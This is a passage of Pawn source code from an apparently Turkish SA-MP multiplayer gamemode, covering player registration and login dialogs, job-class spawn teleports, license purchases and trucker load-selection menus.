			{
				// Store the distance
				distance = distance2;
				// Store the member-id
				result = MemberID;
			}
		}
	}

	// Return the vehicle-id of the closest vehicle
	return result;
}

// Get the distance between the two players
PlayerToPlayer(player1, player2)
{
	// Setup local variables
	new Float:pX, Float:pY, Float:pZ, Float:cX, Float:cY, Float:cZ, Float:distance;
	// Get the player1 position
	GetPlayerPos(player1, pX, pY, pZ);
	// Get the player2 position
	GetPlayerPos(player2, cX, cY, cZ);
	// Calculate the distance
	distance = floatsqroot(floatpower(floatabs(floatsub(cX, pX)), 2) + floatpower(floatabs(floatsub(cY, pY)), 2) + floatpower(floatabs(floatsub(cZ, pZ)), 2));
	// Return the distance to the calling routine
	return floatround(distance);
}

// ************************************************************************************************************************************************************
// PPC_Dialogs
// ************************************************************************************************************************************************************

// Process the Register-dialog
Dialog_Register(playerid, response, inputtext[])
{
	new Yazi[256];

	switch (response) // Check which button was clicked
	{
		case 1: // Player clicked "Register"
		{
			// Check if the player entered a password
			if(strlen(inputtext)>0)
			{
				SHA256_PassHash(inputtext, "", APlayerData[playerid][PlayerPassword], 256);

				Oyuncu_YeniKayit(playerid);

				// 60 Saniye Giriþ Süre
				KillTimer(girisSure[playerid]);
				girisSure[playerid] = -1;

				// Send a message to the client to inform him that his account has been registered
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_AccountRegistered);

				APlayerData[playerid][LoggedIn] = true; // The player has logged in properly
				new Adamm[128];
				format(Adamm, 128, "{FFCC00}» {FFCC00}%s, {FFFFFF}Canakkale Meslek ailesine katýldý. Hoþ geldin {FFCC00}%s.", GetName(playerid), GetName(playerid));
				SendClientMessageToAll(-1, Adamm);

				/*if(!strcmp("-", CalanMP3URL, true))
				{
				}else{
					PlayAudioStreamForPlayer(playerid, CalanMP3URL);
				}*/
                SendClientMessage(playerid, -1, "{FFCC00}» {FFCC00}DJ'{FFFFFF}lerin açtýðý müzikleri dinlemek istiyorsanýz {FFCC00}/sac {FFFFFF}yazabilirsiniz.");

				// Araç Sahiplik Sistemi
			    AKUI_Load(playerid);
				Galeride[playerid] = false;

				foreach(new AracID:ASHPs)
				{
				    new pName[254];
				    GetPlayerName(playerid, pName, sizeof(pName));
				    if(!strcmp(AracSHP[AracID][ASHPSahip], pName, true))
				    {
						AracSHP[AracID][ASHPVehID] = Add_DynamicVehicle(AracSHP[AracID][ASHPModel], AracSHP[AracID][ASHPX], AracSHP[AracID][ASHPY], AracSHP[AracID][ASHPZ], AracSHP[AracID][ASHPRot], AracSHP[AracID][ASHPRenk1], AracSHP[AracID][ASHPRenk2], -1);
						Araclar[ AracSHP[AracID][ASHPVehID] ][AracInSHP] = true;
						Araclar[ AracSHP[AracID][ASHPVehID] ][AracSHPID] = AracID;
						SetVehicleNumberPlate(AracSHP[AracID][ASHPVehID], AracSHP[AracID][ASHPPlaka]);
						SetVehicleToRespawn(AracSHP[AracID][ASHPVehID]);

						Arac_LoadMod(AracID);

						if(AracSHP[AracID][ASHPKaravan] == 1)
						{
							Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravan] = true;
						 	Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravanObj] = CreateDynamicObjectEx(3171, 0, 0, 0, 0, 0, 0, 100.0);
						  	AttachDynamicObjectToVehicle(Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravanObj], AracSHP[AracID][ASHPVehID], 0.084999, -2.125115, -1.144999, -3.014999, 0.000000, 178.890090);

							new KarYazi[500];
							format(KarYazi, 500, "{80FFFF}KARAVAN\n \n{DDDDDD}Sahip {FFC000}%s\n{DDDDDD}Ýçeri girmek için {ADFF2F}/karavan\n{DDDDDD}Aracýnýza takmak için {ADFF2F}Y Tuþu", AracSHP[AracID][ASHPSahip]);
							Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravan3D] = CreateDynamic3DTextLabelEx(KarYazi, -1, 0, 0, 0, 100.0, INVALID_PLAYER_ID, AracSHP[AracID][ASHPVehID]);
						}
				    }
				}
				
				// SpeedoMeter Sistemi [ Yeni Speedo ]
				LoadPlayerSpeedo(playerid);

				MeslekUI_Mod[playerid] = 1;
				MeslekUI_Show(playerid);

				Oyuncu_Kaydet(playerid);
			}
			else
			{
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_WrongPassword);

				format(Yazi, 256, "{FF0000}%s {F8F8FF}geçerli þifre seçmediði için tekmelendi.", GetName(playerid));
				SendClientMessageToAll(-1, Yazi);

				SafeKick(playerid);
			}
		}
	    case 0: // Player clicked "Cancel"
		{
			// Show a message that the player must be registered to play on this server
			SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerMustRegister);

			format(Yazi, 256, "{FF0000}%s {F8F8FF}kayýt olmadýðý için tekmelendi.", GetName(playerid));
			SendClientMessageToAll(-1, Yazi);

		    // Kick the player
			SafeKick(playerid);
		}
	}

	return 1;
}



// Process the login-dialog
Dialog_Login(playerid, response, inputtext[])
{
    switch (response)
    {
        case 1:
        {
            if (strlen(inputtext) > 0)
            {
                Oyuncu_Yukle(playerid, inputtext);
            }else{
            	SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerMustLogin);
            	SafeKick(playerid);
            }
        }
        case 0:
        {
            SendClientMessage(playerid, 0xFFFFFFFF, TXT_PlayerMustLogin);
            SafeKick(playerid);
        }
    }

    return 1;
}



// Process the rescue dialog
Dialog_Rescue(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Check the class of the player
	switch (APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }

			    case 1: TeleportCam(playerid,1, -525.0, -502.0, 26.0,0);
				case 2: TeleportCam(playerid,1, -74.7, -1137.5, 4.5,0);
				case 3: TeleportCam(playerid,1, 1457.0, 975.5, 11.0,0);
				case 4: TeleportCam(playerid,1, -2136.0, -247.5, 36.5,0);
				case 5: TeleportCam(playerid,1, 1766.5, -2040.7, 14.0,0);
				case 6: TeleportCam(playerid,1, -546.0, 2594.0, 54.0,0);
				case 7: TeleportCam(playerid,1, 332.0, 900.0, 25.0,0);
				case 8: TeleportCam(playerid,1, -1575.0, -2724.0, 49.0,0);
				case 9: TeleportCam(playerid,1, -933.2517, 738.0255, 24.6691,0);
				case 10: TeleportCam(playerid,1, 2493.49, 4945.40, 31.34,0);

			   	/*case 1: TeleportCam(playerid,, -525.0, -502.0, 26.0);
				case 2: SetPlayerPos(playerid, -74.7, -1137.5, 4.5);
				case 3: SetPlayerPos(playerid, 1457.0, 975.5, 11.0);
				case 4: SetPlayerPos(playerid, -2136.0, -247.5, 36.5);
				case 5: SetPlayerPos(playerid, 1766.5, -2040.7, 14.0);
				case 6: SetPlayerPos(playerid, -546.0, 2594.0, 54.0);
				case 7: SetPlayerPos(playerid, 332.0, 900.0, 25.0);
				case 8: SetPlayerPos(playerid, -1575.0, -2724.0, 49.0);
				case 9: SetPlayerPos(playerid, -933.2517, 738.0255, 24.6691); // Tugis Truck Stop
				*/

				/*case 0: SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), -525.0, -502.0, 26.0, 0.0, 0, 0, 0, 0, 0, 0);
				case 1: SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), -74.7, -1137.5, 4.5, 0.0, 0, 0, 0, 0, 0, 0);
				case 2: SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), 1457.0, 975.5, 11.0, 0.0, 0, 0, 0, 0, 0, 0);
				case 3: SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), -2136.0, -247.5, 36.5, 270.0, 0, 0, 0, 0, 0, 0);
				case 4: SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), 1766.5, -2040.7, 14.0, 270.0, 0, 0, 0, 0, 0, 0);
				case 5: SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), -546.0, 2594.0, 54.0, 270.0, 0, 0, 0, 0, 0, 0);
				case 6: SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), 332.0, 900.0, 25.0, 205.0, 0, 0, 0, 0, 0, 0);
				case 7: SetSpawnInfo(playerid, 0, GetPlayerSkin(playerid), -1575.0, -2724.0, 49.0, 146.0, 0, 0, 0, 0, 0, 0);*/
			}
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		case ClassBusDriver:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid, 1762.15, -1888.55,   13.55); // ls
				case 2: SetPlayerPos(playerid, -1714.41,  -78.57,    3.55); // SF
				case 3: SetPlayerPos(playerid, 1497.07,  757.35,   10.82); // LV
				case 4: SetPlayerPos(playerid, -1575.0, -2724.0, 49.0); // higway
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
        case ClassDolmusDriver:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid, 2160.77, -1790.74,   13.52);
				case 2: SetPlayerPos(playerid, -2249.30,  546.77,   35.11);
				case 3: SetPlayerPos(playerid, 2893.34, 1880.55,   10.82);
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		case ClassPilot:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
  			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,2010.0, -2345.0, 13.6);
				case 2: SetPlayerPos(playerid,-1211.0, -105.0, 14.2);
				case 3: SetPlayerPos(playerid,1630.0, 1615.0, 10.9);
				case 4: SetPlayerPos(playerid,-5439.8237,806.7692,45.8000); // Kastamonu
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		// copcu
		case ClassCopcu:
		{
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,2195.9705, -1973.5106, 13.5589); // LS
				case 2: SetPlayerPos(playerid,-1858.25, -1519.08, 21.89); // SF
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		// banka
		case ClassBanka:
		{
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,-2426.3179,537.8267,30.0781);
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		// Fire
		case ClassFire:
		{
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,1108.8541,-1211.7532,18.0437);
				case 2: SetPlayerPos(playerid,1775.4115,2065.1565,10.8203);
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		//spawnayarla
		case ClassPolice:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,1568.5, -1693.5, 6.0);
				case 2: SetPlayerPos(playerid,-1590.0, 716.25, -5.0);
				case 3: SetPlayerPos(playerid,2275.0, 2460.0, 10.9);
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		case ClassFBY:

		{

			// Set the spawn coordinates based on the selection in the list

			switch (listitem)

			{

				case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,334.96, -1519.41, 35.86);
				case 2: SetPlayerPos(playerid,-2751.6650,-315.2282,7.1952);
				case 3: SetPlayerPos(playerid,2275.0, 2460.0, 10.9);
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);

		}
 		case ClassMafia:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,2822.5, 898.5, 10.8);
				case 2: SetPlayerPos(playerid,-2094.6711, -2282.2837, 30.6250);//whetstone Mafya yeri

			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		case ClassGemici:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,2571.2776,-2576.5281,10.6500);
				case 2: SetPlayerPos(playerid,-3087.5215,216.4761,7.6500);
				case 3: SetPlayerPos(playerid,880.3694,616.7280,11.7172);
				case 4: SetPlayerPos(playerid,-3322.0332,2373.2634,11.9910);
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
 		case ClassOduncu:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,-531.5685,-96.2541,63.1055);
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
 		case ClassBalikci:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid,2486.8254,-2716.2607,10.6500);
				case 2: SetPlayerPos(playerid,-3005.3818,337.2886,7.6500);
				case 3: SetPlayerPos(playerid,898.2403,649.9003,11.7172);
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
		case ClassPboy:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid, 2099.26, -1807.86, 17.33); //Ls
				case 2: SetPlayerPos(playerid, 2067.2468, 2223.8120, 10.8203); //lv
				case 3: SetPlayerPos(playerid, -1726.6477, 1360.1843, 7.1875); //sf
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
  		case ClassKargocu:
		{
			// Set the spawn coordinates based on the selection in the list
			switch (listitem)
			{
 			    case 0:
			    {
					if(Sirket[playerid] != -1)
					{
			    		SetPlayerPos(playerid, Sirketler[ Sirket[playerid] ][SirketX], Sirketler[ Sirket[playerid] ][SirketY], Sirketler[ Sirket[playerid] ][SirketZ]);
						return 1;
					}
			    }
				case 1: SetPlayerPos(playerid, 1818.85, -1388.44,   13.58); //Ls
				case 2: SetPlayerPos(playerid, -2737.92, -924.88,    9.52); //sf
			}
 			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerInterior(playerid, 0);
		}
	}

	//SpawnPlayer(playerid); // Force the player to spawn at the requested coordinates

	SendClientMessage(playerid, -1, TXT_PlayerRescued); // Send the player a message that using "/rescue" costs $200

	// Reduce the player's money by 200
	//RewardPlayer(playerid, -200, 0);

	return 1;
}



// Process the BuyLicense dialog
Dialog_BuyLicenses(playerid, response, listitem)
{
	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	switch (listitem)
	{
		case 0: // Player wants to buy a trucker license
		{
			// Check if the player is a trucker
			if (APlayerData[playerid][PlayerClass] == ClassTruckDriver)
			{
			    // Check if the player hasn't acquired his trucker's license yet
				if (APlayerData[playerid][TruckerLicense] == 0)
				{
					// Check if the player has enough money and enough score
					if ((APlayerData[playerid][PlayerMoney] >= 50000) && (APlayerData[playerid][PlayerScore] >= 100))
					{
						// Withdraw the money and score from the player's account
						RewardPlayer(playerid, -50000, -100);
						// Give the player the trucker's license
						APlayerData[playerid][TruckerLicense] = 1;
						// Let the player know he acquired his trucker's license
						SendClientMessage(playerid, 0xFFFFFFFF, TXT_TruckerLicenseBought);
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, TXT_TruckerLicenseNotEnoughMoney);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_TruckerLicenseOwned);
			}
			else
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_TruckerLicenseWrongClass);
		}

		case 1: // Player wants to buy a PBoy license

		{

			// Check if the player is a PBoy

			if (APlayerData[playerid][PlayerClass] == ClassPilot)

			{

			    // Check if the player hasn't acquired his trucker's license yet

				if (APlayerData[playerid][PilotLicense] == 0)

				{

					// Check if the player has enough money and enough score

					if ((APlayerData[playerid][PlayerMoney] >= 150000) && (APlayerData[playerid][PlayerScore] >= 100))

					{

						// Withdraw the money and score from the player's account

						RewardPlayer(playerid, -150000, -100);

						// Give the player the trucker's license

						APlayerData[playerid][PilotLicense] = 1;

						// Let the player know he acquired his Tren's license

						SendClientMessage(playerid, 0xFFFFFFFF, TXT_PilotLicenseBought);

					}

					else

					    SendClientMessage(playerid, 0xFFFFFFFF, TXT_PilotLicenseNotEnoughMoney);

				}

				else

				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_PilotLicenseOwned);

			}

			else

				SendClientMessage(playerid, 0xFFFFFFFF, TXT_PilotLicenseWrongClass);

		}
		case 2: // Player wants to buy a busdriver license
		{
			// Check if the player is a busdriver
			if (APlayerData[playerid][PlayerClass] == ClassBusDriver)
			{
			    // Check if the player hasn't acquired his busdriver's license yet
				if (APlayerData[playerid][BusLicense] == 0)
				{
					// Check if the player has enough money and enough score
					if ((APlayerData[playerid][PlayerMoney] >= 25000) && (APlayerData[playerid][PlayerScore] >= 50))
					{
						// Withdraw the money and score from the player's account
						RewardPlayer(playerid, -25000, -50);
						// Give the player the busdriver's license
						APlayerData[playerid][BusLicense] = 1;
						// Let the player know he acquired his busdriver's license
						SendClientMessage(playerid, 0xFFFFFFFF, TXT_BusLicenseBought);
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, TXT_BusLicenseNotEnoughMoney);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_BusLicenseOwned);
			}
			else
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_BusLicenseWrongClass);
		}

		case 3: // Player wants to buy a PBoy license
		{
			// Check if the player is a PBoy
			if (APlayerData[playerid][PlayerClass] == ClassGemici)
			{
			    // Check if the player hasn't acquired his trucker's license yet
				if (APlayerData[playerid][GemiciLicense] == 0)
				{
					// Check if the player has enough money and enough score
					if ((APlayerData[playerid][PlayerMoney] >= 150000) && (APlayerData[playerid][PlayerScore] >= 100))
					{
						// Withdraw the money and score from the player's account
						RewardPlayer(playerid, -150000, -100);

						// Give the player the trucker's license
						APlayerData[playerid][GemiciLicense] = 1;

						// Let the player know he acquired his Tren's license
						SendClientMessage(playerid, 0xFFFFFFFF, "{FFCC00}» {FFFFFF}Gemi Ehliyeti {F8F8FF}aldýnýz. Artýk kendi rotanýzý seçebilirsiniz.");
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Gemi Ehliyeti alacak paranýz ve skorunuz yok");
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Zaten Gemi Ehliyetiniz var");
			}
			else
				SendClientMessage(playerid, 0xFFFFFFFF, "{FF0000}Gemi Ehliyeti almak için Gemici olmanýz gerekiyor!");
		}
		case 4: // Player wants to buy a mafia license
		{
			// Check if the player is a PBoy
			if (APlayerData[playerid][PlayerClass] == ClassMafia)
			{
			    // Check if the player hasn't acquired his trucker's license yet
				if (APlayerData[playerid][MafiaLicense] == 0)
				{
					// Check if the player has enough money and enough score
					if ((APlayerData[playerid][PlayerMoney] >= 250000) && (APlayerData[playerid][PlayerScore] >= 200))
					{
						// Withdraw the money and score from the player's account
						RewardPlayer(playerid, -250000, -200);

						// Give the player the trucker's license
						APlayerData[playerid][MafiaLicense] = 1;

						// Let the player know he acquired his Tren's license
						SendClientMessage(playerid, 0xFFFFFFFF, TXT_MafiaLicenseBought);
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, TXT_MafiaLicenseNotEnoughMoney);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_MafiaLicenseOwned);
			}
			else
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_MafiaLicenseWrongClass);
		}
		case 5: // Player wants to buy a busdriver license
		{
			// Check if the player is a busdriver
			if (APlayerData[playerid][PlayerClass] == ClassDolmusDriver)
			{
			    // Check if the player hasn't acquired his busdriver's license yet
				if (APlayerData[playerid][DolmusLicense] == 0)
				{
					// Check if the player has enough money and enough score
					if ((APlayerData[playerid][PlayerMoney] >= 25000) && (APlayerData[playerid][PlayerScore] >= 50))
					{
						// Withdraw the money and score from the player's account
						RewardPlayer(playerid, -25000, -50);
						// Give the player the busdriver's license
						APlayerData[playerid][DolmusLicense] = 1;
						// Let the player know he acquired his busdriver's license
						SendClientMessage(playerid, 0xFFFFFFFF, TXT_DolmusLicenseBought);
					}
					else
					    SendClientMessage(playerid, 0xFFFFFFFF, TXT_DolmusLicenseNotEnoughMoney);
				}
				else
				    SendClientMessage(playerid, 0xFFFFFFFF, TXT_DolmusLicenseOwned);
			}
			else
				SendClientMessage(playerid, 0xFFFFFFFF, TXT_DolmusLicenseWrongClass);
		}
	}

	return 1;
}



// Process the work dialog for licensed truckers (show the list of loads after the player selected to choose his own load)
Dialog_TruckerSelectJobMethod(playerid, response, listitem)
{
	// Setup local variables
	new ProductList[50], NumProducts, TotalLoadList[1000];

	// Just close the dialog if the player clicked "Cancel"
	if(!response) return 1;

	// Select what to do after the player chose "Select your own load" or "Auto assigned load"
	switch (listitem)
	{
		case 0: // Let the player choose his own load
		{
			switch (GetVehicleModel(GetPlayerVehicleID(playerid))) // Check the vehicle-model of the player to decide which loads the player can carry
			{
				case VehicleFlatbed, VehicleDFT30: // If the player's vehicle is a "Flatbed" or "DFT-30"
					ProductList = Product_GetList(PCV_TruckerNoTrailer, NumProducts); // Build a list of products defined for truckers without a trailer
				case VehicleCementTruck: // If the player's vehicle is a "CementTruck"
					ProductList = Product_GetList(PCV_TruckerCementTruck, NumProducts); // Build a list of products defined for truckers witha cement truck
				case VehicleLineRunner, VehicleTanker, VehicleRoadTrain: // If the player's vehicle is a "LineRunner", "Tanker" or "RoadTrain"
				{
					switch (GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(playerid)))) // Select the loads based on the trailer model of the player
					{
						case VehicleTrailerCargo, VehicleTrailerCargo2: // A cargo-trailer is attached
							ProductList = Product_GetList(PCV_TruckerCargoTrailer, NumProducts); // Build a list of products defined for truckers with a cargo-trailer
						case VehicleTrailerOre: // An Ore-trailer is attached
							ProductList = Product_GetList(PCV_TruckerOreTrailer, NumProducts); // Build a list of products defined for truckers with an ore-trailer
						case VehicleTrailerFluids: // A fluids-trailer is attached
							ProductList = Product_GetList(PCV_TruckerFluidsTrailer, NumProducts); // Build a list of products defined for truckers with a fluids-trailer
					}
				}
			}

			// Build the List with product-names
			for (new i; i < NumProducts; i++)
				format(TotalLoadList, 1000, "%s%s\n", TotalLoadList, ALoads[ProductList[i]][LoadName]);

			// Let the player choose a load
 			ShowPlayerDialog(playerid, DialogTruckerSelectLoad, DIALOG_STYLE_LIST, TXT_TruckerDialogSelectLoad, TotalLoadList, TXT_DialogButtonSelect, TXT_DialogButtonCancel);
		}

		case 1: Trucker_StartRandomJob(playerid); // Start a random trucker-job
	}

	return 1;
}



// Process the selected load and create the startlocation-dialog
Dialog_TruckerSelectLoad(playerid, response, listitem)
{
    // Setup local variables
	new TotalStartLocList[1000], ProductList[50], NumProducts, ProductID, LocID;

	// Just close the dialog if the player clicked "Cancel"
	if(!response) return ShowPlayerDialog(playerid, DialogTruckerJobMethod, DIALOG_STYLE_LIST, "Yöntem Seç:", "Kendini Yükünü ve Rotaný Belirle\r\nRastgele Görev", "Seç", "Ýptal");

	// First get the list of products again, so we can retrieve the selected load from it
	switch (GetVehicleModel(GetPlayerVehicleID(playerid))) // Check the vehicle-model of the player
	{
		case VehicleFlatbed, VehicleDFT30: // If the player's vehicle is a "Flatbed" or "DFT-30"
			ProductList = Product_GetList(PCV_TruckerNoTrailer, NumProducts); // Build a list of products defined for truckers without a trailer
		case VehicleCementTruck: // If the player's vehicle is a "CementTruck"
			ProductList = Product_GetList(PCV_TruckerCementTruck, NumProducts); // Build a list of products defined for truckers witha cement truck
		case VehicleLineRunner, VehicleTanker, VehicleRoadTrain: // If the player's vehicle is a "LineRunner", "Tanker" or "RoadTrain"
		{
			switch (GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(playerid)))) // Select the loads based on the trailer model of the player
			{
				case VehicleTrailerCargo, VehicleTrailerCargo2: // A cargo-trailer is attached
					ProductList = Product_GetList(PCV_TruckerCargoTrailer, NumProducts); // Build a list of products defined for truckers with a cargo-trailer
				case VehicleTrailerOre: // An Ore-trailer is attached
					ProductList = Product_GetList(PCV_TruckerOreTrailer, NumProducts); // Build a list of products defined for truckers with an ore-trailer
				case VehicleTrailerFluids: // A fluids-trailer is attached
					ProductList = Product_GetList(PCV_TruckerFluidsTrailer, NumProducts); // Build a list of products defined for truckers with a fluids-trailer
			}
		}
	}

	// Store the selected LoadID in the player's account
	APlayerData[playerid][LoadID] = ProductList[listitem];
	ProductID = APlayerData[playerid][LoadID];

	// Build a list of start-locations for this product
	for (new i; i < 30; i++)
	{
	    // Get the location-id
	    LocID = ALoads[ProductID][FromLocations][i];
	    // Check if it a valid location-id (not 0)
	    if (LocID != 0)
			format(TotalStartLocList, 1000, "%s%s\n", TotalStartLocList, ALocations[LocID][LocationName]); // Add the location-name to the list
		else
		    break; // As soon as an invalid location-id has been found, stop adding entries to the location-list
	}

	// Ask the player to choose a start-location
	ShowPlayerDialog(playerid, DialogTruckerStartLoc, DIALOG_STYLE_LIST, TXT_TruckerDialogSelectStartLoc, TotalStartLocList, TXT_DialogButtonSelect, TXT_DialogButtonCancel); // Let the player choose a starting location

	return 1;
}



// Process the selected startlocation and create the endlocation-dialog
Dialog_TruckerSelectStartLoc(playerid, response, listitem)
{
    // Setup local variables
	new ProductID, LocID, TotalEndLocList[1000], NumProducts, ProductList[50], TotalLoadList[1000];

	// Just close the dialog if the player clicked "Cancel"
	if(!response)
	{
		switch (GetVehicleModel(GetPlayerVehicleID(playerid))) // Check the vehicle-model of the player to decide which loads the player can carry
		{
			case VehicleFlatbed, VehicleDFT30: // If the player's vehicle is a "Flatbed" or "DFT-30"
				ProductList = Product_GetList(PCV_TruckerNoTrailer, NumProducts); // Build a list of products defined for truckers without a trailer
			case VehicleCementTruck: // If the player's vehicle is a "CementTruck"
				ProductList = Product_GetList(PCV_TruckerCementTruck, NumProducts); // Build a list of products defined for truckers witha cement truck
			case VehicleLineRunner, VehicleTanker, VehicleRoadTrain: // If the player's vehicle is a "LineRunner", "Tanker" or "RoadTrain"
			{
				switch (GetVehicleModel(GetVehicleTrailer(GetPlayerVehicleID(playerid)))) // Select the loads based on the trailer model of the player
				{
